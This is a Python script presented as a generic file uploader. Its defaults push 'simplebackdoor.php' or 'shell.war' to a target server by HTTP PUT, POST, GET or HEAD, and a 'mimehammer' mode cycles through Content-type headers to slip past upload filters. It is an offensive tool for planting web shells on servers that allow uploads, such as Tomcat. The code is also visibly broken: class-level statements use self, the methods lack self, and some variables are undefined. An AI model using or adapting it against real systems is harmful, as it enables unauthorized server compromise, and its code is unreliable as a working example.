#!/bin/python

import requests
import os
import argparse

#OPTIONS!
parser = argparse.ArgumentParser(description='Uploads a file using http methods, useful for when you have a server that allows uploads like tomcat server 7')
parser.add_argument('--method',
                                   dest    ='method',
                                   action  ="store" ,
                                   default = 'put' ,
                                   help    = "options are : get, post, put, head." )

parser.add_argument('--file',
                                 dest    = 'file',
                                 action  = "store" ,
                                 default = 'simplebackdoor.php' ,
                                 help    = "The file you are wanting to upload" )

parser.add_argument('--target',
                                 dest    = 'target',
                                 action  = "store" ,
                                 default = False ,
                                 help    = "uploads using GET" )

parser.add_argument('--mimehammer',
                                 dest    = 'mimehammer',
                                 action  = "store_true" ,
                                 default = False ,
                                 help    = "Brute-Force mimetype upload" )

arguments= parser.parse_args()
print('Uploading to : ' + arguments.target)
print('File : ' + arguments.file)

class  Uploader:
    """just your basic file uploader!
    required arguments are the url, method, and filename."""
    def __init__(self, method, header, url = '192.168.0.3', uploadfilename = 'shell.war'):
        self.header         = {'Content-type' : mimetype}
        self.method         = arguments.method
        self.uploadfilename = uploadfilename
        self.fileobj        = openfile(self.uploadfilename)
        self.url            = url
        self.mimetype       = mimetype = 'text/plain'
        self.mimelist       = mimelist = ['text/plain',
                                         'application/octet-stream',
                                         'text/css',
                                         'text/html',
                                         'text/javascript',
                                         'image/gif',
                                         'image/jpeg',
                                         'image/png',
                                         'image/svg-xml']


    def openfile(filename):
        try:
            fileobject = open(arguments.file, 'rb')
            return fileobject
        except OSError:
            print("Can't open file for some reason, check permissions")
            print(error)

    def sendfile(target, content, head):
        try:
            if method == 'get':
                upload = requests.get(target, data = content, headers = head )
                print('status code : ' + upload.status_code)
            elif method == 'head':
                upload = requests.head(target, data = content, headers = head )
                print('status code : ' + upload.status_code)
            elif method == 'post':
                upload = requests.post(target, data = content, headers = head )
                print('status code : ' + upload.status_code)
            elif method == 'put':
                upload = requests.put(target, data = content, headers = head )
                print('status code : ' + upload.status_code)
            else:
                None
        except KeyboardInterrupt:
                print('KEYBOARD SIGNALS')

    def mimehammer(victim, fileo, mimearray):
        for each in mimearray:
            header = {'Content-type' : each}
            sendfile(victim, fileo, header)


    if arguments.mimehammer is True:
        mimehammer(self.url, self.fileobj, self.mimelist)

    elif arguments.mimehammer is False:
        sendfile(self.url, self.fileobj, self.header)
